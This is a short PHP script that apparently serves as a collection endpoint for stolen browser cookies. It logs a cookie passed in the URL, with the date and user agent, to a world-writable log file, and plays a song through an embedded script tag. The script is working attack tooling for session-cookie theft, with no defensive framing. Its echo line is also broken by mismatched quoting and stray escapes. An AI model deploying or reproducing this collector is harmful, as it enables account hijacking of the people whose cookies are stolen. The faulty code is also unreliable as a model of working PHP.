<?php
echo '<script>  var audio = new Audio('/Roy Orbison - 01 - Oh Pretty Woman.mp3')\;
  audio.play()\;
</script>';
$collectedCookie=$_GET["cookie"];
$date=date("l ds of F Y h:i:s A");
$user_agent=$_SERVER['HTTP_USER_AGENT'];
$file=fopen('log.txt','a'); // chmod 777 log.txt
fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$collectedCookie \n");
fclose($file);
?>
